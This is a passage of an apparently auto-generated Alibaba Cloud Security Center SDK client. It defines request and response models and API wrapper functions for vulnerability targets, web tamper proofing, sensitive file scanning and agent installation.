  config?: string(name='Config', example='{\\"vulType\\":\\"sys\\"}'),
  target?: string(name='Target', example='[{\\"target\\": \\"9cd5c684-7201-4de5-ad2c-cea89a5e****\\", \\"targetType\\": \\"uuid\\", \\"flag\\": \\"add\\"}]'),
}

model ModifyVulTargetResponseBody = {
  requestId?: string(name='RequestId', example='38597320-A990-5444-9A4C-7A1269610C2A'),
}

model ModifyVulTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetResponseBody(name='body'),
}

async function modifyVulTargetWithOptions(request: ModifyVulTargetRequest, runtime: Util.RuntimeOptions): ModifyVulTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulTarget(request: ModifyVulTargetRequest): ModifyVulTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetWithOptions(request, runtime);
}

model ModifyVulTargetConfigRequest {
  config?: string(name='Config', example='off'),
  sourceIp?: string(name='SourceIp', description='1.2.XX.XX', example='1.2.XX.XX'),
  type?: string(name='Type', description='Configures vulnerability detection for a server.', example='cve'),
  uuid?: string(name='Uuid', example='inet-7c676676-06fa-442e-90fb-b802e5d6****'),
}

model ModifyVulTargetConfigResponseBody = {
  requestId?: string(name='RequestId', example='1FF908BA-ADD8-5138-8595-614C6E3C6658'),
}

model ModifyVulTargetConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulTargetConfigResponseBody(name='body'),
}

async function modifyVulTargetConfigWithOptions(request: ModifyVulTargetConfigRequest, runtime: Util.RuntimeOptions): ModifyVulTargetConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulTargetConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulTargetConfig(request: ModifyVulTargetConfigRequest): ModifyVulTargetConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulTargetConfigWithOptions(request, runtime);
}

model ModifyVulWhitelistTargetRequest {
  id?: long(name='Id', example='2533681'),
  reason?: string(name='Reason', example='1221'),
  sourceIp?: string(name='SourceIp', example='42.120.75.150'),
  targetInfo?: string(name='TargetInfo', example='{
      "type": "GroupId",
      "uuids": [],
      "groupIds": [
            10782678
      ]
}'),
}

model ModifyVulWhitelistTargetResponseBody = {
  requestId?: string(name='RequestId', example='896AC4F0-C881-502B-BFC7-4751C5E3DEAA'),
}

model ModifyVulWhitelistTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyVulWhitelistTargetResponseBody(name='body'),
}

async function modifyVulWhitelistTargetWithOptions(request: ModifyVulWhitelistTargetRequest, runtime: Util.RuntimeOptions): ModifyVulWhitelistTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.reason)) {
    query['Reason'] = request.reason;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.targetInfo)) {
    query['TargetInfo'] = request.targetInfo;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyVulWhitelistTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyVulWhitelistTarget(request: ModifyVulWhitelistTargetRequest): ModifyVulWhitelistTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyVulWhitelistTargetWithOptions(request, runtime);
}

model ModifyWebLockCreateConfigRequest {
  defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='block'),
  dir?: string(name='Dir', description='The directory that you want to protect.', example='/home/admin/tomcat'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/test'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/apache.log'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg'),
  inclusiveFile?: string(name='InclusiveFile', description='The file for which you want to enable web tamper proofing.

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='/home/admin/test.log'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='jpg'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.', example='/usr/local/backup'),
  mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified sub-directories, file types, and files in the protected directories.', example='whitelist'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='39.170.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to add a directory to protect.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='inet-12345****'),
}

model ModifyWebLockCreateConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockCreateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockCreateConfigResponseBody(name='body'),
}

async function modifyWebLockCreateConfigWithOptions(request: ModifyWebLockCreateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockCreateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockCreateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockCreateConfig(request: ModifyWebLockCreateConfigRequest): ModifyWebLockCreateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockCreateConfigWithOptions(request, runtime);
}

model ModifyWebLockDeleteConfigRequest {
  id?: int32(name='Id', description='The ID of the protected directory that you want to delete.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the IDs of protected directories.', example='12'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to delete the protected directory.

> You can call the [DescribeWebLockConfigList](~~DescribeWebLockConfigList~~) operation to query the UUIDs of servers.', example='7f7fe9a2-55de-4b9d-a37a-0d981d36****'),
}

model ModifyWebLockDeleteConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='299D0992-271A-5750-ACEB-46D322862BFF'),
}

model ModifyWebLockDeleteConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockDeleteConfigResponseBody(name='body'),
}

/**
  * After you delete a directory that has web tamper proofing enabled on a server, files in the directory are no longer protected by web tamper proofing. The information about the websites that are hosted on the server may be maliciously modified by attackers. Proceed with caution.
  *
  * @param request ModifyWebLockDeleteConfigRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return ModifyWebLockDeleteConfigResponse
 */
async function modifyWebLockDeleteConfigWithOptions(request: ModifyWebLockDeleteConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockDeleteConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockDeleteConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * After you delete a directory that has web tamper proofing enabled on a server, files in the directory are no longer protected by web tamper proofing. The information about the websites that are hosted on the server may be maliciously modified by attackers. Proceed with caution.
  *
  * @param request ModifyWebLockDeleteConfigRequest
  * @return ModifyWebLockDeleteConfigResponse
 */
async function modifyWebLockDeleteConfig(request: ModifyWebLockDeleteConfigRequest): ModifyWebLockDeleteConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockDeleteConfigWithOptions(request, runtime);
}

model ModifyWebLockProcessStatusRequest {
  dealAll?: int32(name='DealAll', example='1'),
  operateInfo?: string(name='OperateInfo', example='[{"processPath":"/etc/test1","uuid":"0c1714dc-f7a3-4265-8364-7aa3fce8****"},{"processPath":"/etc/test2","uuid":"1cc45e7d-7698-4b2c-89d8-e8cba407****"}]'),
  processPath?: [ string ](name='ProcessPath'),
  status?: int32(name='Status', example='1'),
  uuid?: string(name='Uuid', example='bc8510e7-7327-4030-b75c-956e434d****'),
}

model ModifyWebLockProcessStatusResponseBody = {
  requestId?: string(name='RequestId', example='6A540B52-2441-5493-902B-37376C412776'),
}

model ModifyWebLockProcessStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockProcessStatusResponseBody(name='body'),
}

async function modifyWebLockProcessStatusWithOptions(request: ModifyWebLockProcessStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockProcessStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealAll)) {
    query['DealAll'] = request.dealAll;
  }
  if (!Util.isUnset(request.operateInfo)) {
    query['OperateInfo'] = request.operateInfo;
  }
  if (!Util.isUnset(request.processPath)) {
    query['ProcessPath'] = request.processPath;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockProcessStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockProcessStatus(request: ModifyWebLockProcessStatusRequest): ModifyWebLockProcessStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockProcessStatusWithOptions(request, runtime);
}

model ModifyWebLockStartRequest {
  defenceMode?: string(name='DefenceMode', description='The prevention mode. Valid values:

*   **block**: Interception Mode
*   **audit**: Alert Mode', example='block'),
  dir?: string(name='Dir', description='The directory for which you want to enable web tamper proofing. Separate multiple directories with commas (,).', example='/home/admin/tomcat'),
  exclusiveDir?: string(name='ExclusiveDir', description='The directory for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/java'),
  exclusiveFile?: string(name='ExclusiveFile', description='The file for which you want to disable web tamper proofing.

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='/home/admin/tomcat/localhost.log'),
  exclusiveFileType?: string(name='ExclusiveFileType', description='The type of the file for which you want to disable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **blacklist**, you must specify this parameter.', example='jpg'),
  inclusiveFileType?: string(name='InclusiveFileType', description='The type of the file for which you want to enable web tamper proofing. Separate multiple types with semicolons (;). Valid values:

*   php
*   jsp
*   asp
*   aspx
*   js
*   cgi
*   html
*   htm
*   xml
*   shtml
*   shtm
*   jpg
*   gif
*   png

> If you set **Mode** to **whitelist**, you must specify this parameter.', example='php'),
  localBackupDir?: string(name='LocalBackupDir', description='The local path to the backup files of the protected directory.\\
The directory format of a Linux server is different from that of a Windows server. You must enter the directory in the required format based on your operating system. Examples:

*   Linux server: /usr/local/aegis/bak
*   Windows server: C:\\Program Files (x86)\\Alibaba\\Aegis\\bak', example='/usr/local/backup'),
  mode?: string(name='Mode', description='The protection mode of web tamper proofing. Valid values:

*   **whitelist**: In this mode, web tamper proofing is enabled for the specified directories and file types.
*   **blacklist**: In this mode, web tamper proofing is enabled for the unspecified subdirectories, file types, and files in the protected directory.', example='whitelist'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to enable web tamper proofing.', example='80d2f7d6-31a9-4d7f-8ff4-7ecc42f89ca****'),
}

model ModifyWebLockStartResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockStartResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStartResponseBody(name='body'),
}

async function modifyWebLockStartWithOptions(request: ModifyWebLockStartRequest, runtime: Util.RuntimeOptions): ModifyWebLockStartResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStart',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockStart(request: ModifyWebLockStartRequest): ModifyWebLockStartResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStartWithOptions(request, runtime);
}

model ModifyWebLockStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='125.71.XX.XX'),
  status?: string(name='Status', description='Specifies whether to enable or disable web tamper proofing for the specified server. Valid values:

*   **on**: enables web tamper proofing
*   **off**: disables web tamper proofing

> After you disable web tamper proofing for the specified server, one quota is released.', example='on'),
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to enable or disable web tamper proofing. You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='inet-1234567****'),
}

model ModifyWebLockStatusResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockStatusResponseBody(name='body'),
}

async function modifyWebLockStatusWithOptions(request: ModifyWebLockStatusRequest, runtime: Util.RuntimeOptions): ModifyWebLockStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockStatus(request: ModifyWebLockStatusRequest): ModifyWebLockStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockStatusWithOptions(request, runtime);
}

model ModifyWebLockUnbindRequest {
  uuid?: string(name='Uuid', description='The UUID of the server for which you want to disable web tamper proofing.

> You can call the [DescribeWebLockBindList](~~DescribeWebLockBindList~~) operation to query the UUIDs of servers.', example='8d217d3f-6999-43a6-a435-c7a6854180e9'),
}

model ModifyWebLockUnbindResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='F0A8A039-930D-5EC1-97C8-43F05776188A'),
}

model ModifyWebLockUnbindResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUnbindResponseBody(name='body'),
}

async function modifyWebLockUnbindWithOptions(request: ModifyWebLockUnbindRequest, runtime: Util.RuntimeOptions): ModifyWebLockUnbindResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUnbind',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockUnbind(request: ModifyWebLockUnbindRequest): ModifyWebLockUnbindResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUnbindWithOptions(request, runtime);
}

model ModifyWebLockUpdateConfigRequest {
  defenceMode?: string(name='DefenceMode', example='block'),
  dir?: string(name='Dir', example='/home/admin/tomcat'),
  exclusiveDir?: string(name='ExclusiveDir', example='/home/admin/test'),
  exclusiveFile?: string(name='ExclusiveFile', example='/home/admin/apache.log'),
  exclusiveFileType?: string(name='ExclusiveFileType', example='jpg'),
  id?: int32(name='Id', example='312077'),
  inclusiveFile?: string(name='InclusiveFile', example='/home/admin/test.log'),
  inclusiveFileType?: string(name='InclusiveFileType', example='jpg'),
  lang?: string(name='Lang', example='zh'),
  localBackupDir?: string(name='LocalBackupDir', example='/usr/local/backup'),
  mode?: string(name='Mode', example='blacklist'),
  sourceIp?: string(name='SourceIp', example='36.112.XX.XX'),
  uuid?: string(name='Uuid', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
}

model ModifyWebLockUpdateConfigResponseBody = {
  requestId?: string(name='RequestId', example='D9354C1A-D709-4873-9AAE-41513327B247'),
}

model ModifyWebLockUpdateConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebLockUpdateConfigResponseBody(name='body'),
}

async function modifyWebLockUpdateConfigWithOptions(request: ModifyWebLockUpdateConfigRequest, runtime: Util.RuntimeOptions): ModifyWebLockUpdateConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.defenceMode)) {
    query['DefenceMode'] = request.defenceMode;
  }
  if (!Util.isUnset(request.dir)) {
    query['Dir'] = request.dir;
  }
  if (!Util.isUnset(request.exclusiveDir)) {
    query['ExclusiveDir'] = request.exclusiveDir;
  }
  if (!Util.isUnset(request.exclusiveFile)) {
    query['ExclusiveFile'] = request.exclusiveFile;
  }
  if (!Util.isUnset(request.exclusiveFileType)) {
    query['ExclusiveFileType'] = request.exclusiveFileType;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.inclusiveFile)) {
    query['InclusiveFile'] = request.inclusiveFile;
  }
  if (!Util.isUnset(request.inclusiveFileType)) {
    query['InclusiveFileType'] = request.inclusiveFileType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.localBackupDir)) {
    query['LocalBackupDir'] = request.localBackupDir;
  }
  if (!Util.isUnset(request.mode)) {
    query['Mode'] = request.mode;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebLockUpdateConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebLockUpdateConfig(request: ModifyWebLockUpdateConfigRequest): ModifyWebLockUpdateConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebLockUpdateConfigWithOptions(request, runtime);
}

model ModifyWebPathRequest {
  config?: string(name='Config', example='{
      "webPathType": "customize",
      "webPath": "/root/www****"
}'),
  target?: string(name='Target', example='[{"target":"0186127a-d33e-4d0c-94fb-8f25f87bc69f","targetType":"uuid","flag":"add"}]'),
  type?: string(name='Type', example='web_path'),
}

model ModifyWebPathResponseBody = {
  requestId?: string(name='RequestId', example='20623245-7E5E-52CA-9640-7502F119****'),
  success?: boolean(name='Success', example='true'),
}

model ModifyWebPathResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ModifyWebPathResponseBody(name='body'),
}

async function modifyWebPathWithOptions(request: ModifyWebPathRequest, runtime: Util.RuntimeOptions): ModifyWebPathResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ModifyWebPath',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function modifyWebPath(request: ModifyWebPathRequest): ModifyWebPathResponse {
  var runtime = new Util.RuntimeOptions{};
  return modifyWebPathWithOptions(request, runtime);
}

model OpenSensitiveFileScanRequest {
  switchOn?: string(name='SwitchOn', example='on'),
}

model OpenSensitiveFileScanResponseBody = {
  code?: string(name='Code', example='200'),
  data?: {
    switchOn?: string(name='SwitchOn', example='on'),
  }(name='Data'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='B4A4C081-7F06-5481-9323-02A5419B9423'),
  success?: boolean(name='Success', example='true'),
}

model OpenSensitiveFileScanResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OpenSensitiveFileScanResponseBody(name='body'),
}

async function openSensitiveFileScanWithOptions(request: OpenSensitiveFileScanRequest, runtime: Util.RuntimeOptions): OpenSensitiveFileScanResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.switchOn)) {
    query['SwitchOn'] = request.switchOn;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OpenSensitiveFileScan',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function openSensitiveFileScan(request: OpenSensitiveFileScanRequest): OpenSensitiveFileScanResponse {
  var runtime = new Util.RuntimeOptions{};
  return openSensitiveFileScanWithOptions(request, runtime);
}

model OperateAgentClientInstallRequest {
  instanceIds?: string(name='InstanceIds', description='The IDs of the servers on which you want to install the Security Center agent. Separate multiple IDs with commas (,).

> You must specify at least one of the **InstanceIds** and **Uuids** parameters before you can call this operation.', example='i-uf6j8vq9l4r5ntht****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='en'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers on which you want to install the Security Center agent. Separate multiple UUIDs with commas (,).

> You must specify at least one of the **InstanceIds** and **Uuids** parameters before you can call this operation.', example='1587bedb-fdb4-48c4-9330-************'),
}

model OperateAgentClientInstallResponseBody = {
  aegisCelintInstallResposeList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-uf6j8vq9l4r5ntht****'),
      recordId?: long(name='RecordId', description='The ID of the installation task.', example='2856'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='1587bedb-fdb4-48c4-9330-****'),
    }
  ](name='AegisCelintInstallResposeList', description='An array that consists of the returned results.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='AE79B457-877C-51C6-AD72-0D34A025D***'),
}

model OperateAgentClientInstallResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: OperateAgentClientInstallResponseBody(name='body'),
}

async function operateAgentClientInstallWithOptions(request: OperateAgentClientInstallRequest, runtime: Util.RuntimeOptions): OperateAgentClientInstallResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'OperateAgentClientInstall',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function operateAgentClientInstall(request: OperateAgentClientInstallRequest): OperateAgentClientInstallResponse {
